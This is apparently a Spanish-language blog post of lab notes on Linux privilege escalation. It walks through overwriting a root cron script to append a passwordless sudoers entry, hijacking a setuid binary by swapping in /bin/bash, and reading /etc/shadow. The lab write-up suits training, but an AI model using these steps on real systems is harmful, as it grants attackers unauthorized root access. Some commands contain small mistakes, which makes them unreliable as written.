---
title: "Explotación y Post Explotación"
date: 2026-04-20 21:39:00 -0500
categories: [Hacking, Vulnerabilidades, Explotación]
tags: [shellshock, Metasploit, privesc, webdav, cracking, kiwi, incognito, powersploit, john]
description: Laboratorios.
toc: true
---

# Cron Jobs Gone Wild II
Cron es un salvavidas para los administradores cuando se trata de realizar tareas de mantenimiento periódicas en el sistema. Incluso pueden utilizarse en casos donde las tareas se llevan a cabo dentro de directorios de usuarios individuales. Sin embargo, tales automatizaciones deben usarse con precaución o pueden dar lugar a ataques fáciles de escalada de privilegios.

Para este laboratorio, nos dan un servicio activo en el puerto 8000, el cual tiene una webshell con un usuario student.

```shell
id
uid=999(student) gid=999(student) groups=999(student)

cat /etc/shadow
cat /etc/sudoers 
```
sudoers es un archivo en donde puedo configurar que binarios quiero permitir a distintos usuarios o grupos para que tengan permisos.

Una herramienta que permite monitorar los procesos activos en linux es **[PSPY](https://github.com/DominicBreuker/pspy)**, permite detectar las tareas que se ejecutan de manera automatizadas cada cierto tiempo.

Para esta práctica al no tener internet se procede de una manera manual.

```shell
ls -la
    message
cat message
    permission denied
```
Al no tener permisos, debemos buscar un comando que permita buscar que ruta hace este llamado, para ello utilizamos el comando **find**.
```shell
find / -name message 2>/dev/null
tmp/message
cat tmp/message
    Hey!! You are no root :(
```
Donde cada comando significa lo siguiente:
-           / -> busca en la raíz de todo el sistema
-       -name -> busca cualquier archivo con el nombre message
- 2>/dev/null -> envía todos los errores de permisis denegados a la carpeta null

Ahora como ya descubrimos que está el ejecutable en esa ruta podemos ver qué ficheros están ahí
```shell
ls -l /tmp
    message
    ready
```
En donde message tiene un registro de que se modificó recientemente, por lo que sabemos que hay un script o binario modificandolo cada minuto.

```shell
grep -ri /tmp/message / 2>/dev/null
    /usr/local/share/copy.sh:cp /home/student/message /tmp/student
    /usr/local/share/copy.sh:chmod 644 /tmp/student
```
- -r -> busca de forma recursiva en los directorios que yo le indique
- -i -> ignora las mayúsculas y minúsculas

Al haber encontrado el script que se encarga de hacer las copias, procedemos a leer el mismo

```shell
cat /usr/local/share/copy.sh
    #! /bin/bash
    cp /home/student/message /tmp/message
    chmod 644 /tmp/message
```

Si encontramos la forma de modificar el archivo copy.sh, podemos lograr escalar privilegios como administrador.

```shell
echo '#!/bin/bash' > /usr/share/copy.sh
```
Al modificar el archivo ya sabemos que si nos deja reemplazar el contenido, con eso ahora si procedemos a editar a nuestro gusto

```shell
echo 'echo"student ALL=NOPASSWORD:ALL" >> /etc/sudoers' >> /usr/local/share/copy.sh
sudo su
    cat /etc/sudoers
```
Con esto hacemos que el usuario student tenga permiso de ejecutar cualquier binario sin contraseña al agregarlo en la última línea de sudoers con el comando **>>**. Esperamos 1 minuto a que se ejecute el script y ya tenemos acceso sudo su.


## Exploting Setuid Programs
Para este laboratorio, nos dan un servicio activo en el puerto 8000, el cual tiene una webshell con un usuario student.
```shell
ls
    greetings welcome
file welcome
    welcome: setuid ELF 64-bits
cat greetings
    Permission denied
ls -la
    greetings
    -r-x------ welcome
    -rwsr-xr-x greetings
```

Con file podemos ver que welcome es un binario del tipo linux, similar a un exe en windows.
-rw**S**r significa que es un binario con SETUID al tener el bit **"S"** y es un binario que tiene un comportamiento especial, ya que cuando se ejecutan toman los permisos del propietario del archivo, en lugar del usuario que los ejecuta.

Para leer el binario welcome de forma legible, se utiliza el comando **strings**
```shell
strings welcome
```
El comando muestra que dentro del binario está ejecutando greetings. Para probar se intenta eliminar el archivo greetings y lo logramos, lo que significa que nosotros podemos crear un archivo greetings nuestro para que lo ejecute welcome con sus privilegios.

```shell
rm -r greetings

cp /bin/bash greetings
ls
    welcome greetings
```

Al hacer esta copia, tenemos que greetings es una /bin/bash y al ejecutarlo practicamente estaremos abriendo una bash con permisos de root.

```shell
./welcome

# whoami
    root
```
Para encontrar binarios vulnerables, podemos hacer uso de la web **[GTFOFBINS](https://gtfobins.org/)**, para encontrar un binario solo ejecutamos el siguiente comando:
```shell
find / -perm -4000 2>/dev/null
```

> Nota: Binarios -4000 son los que tienen el bit SUID activado.
{: .prompt-warning }

## NetBIOS Hacking
Video hasta 1:00:00

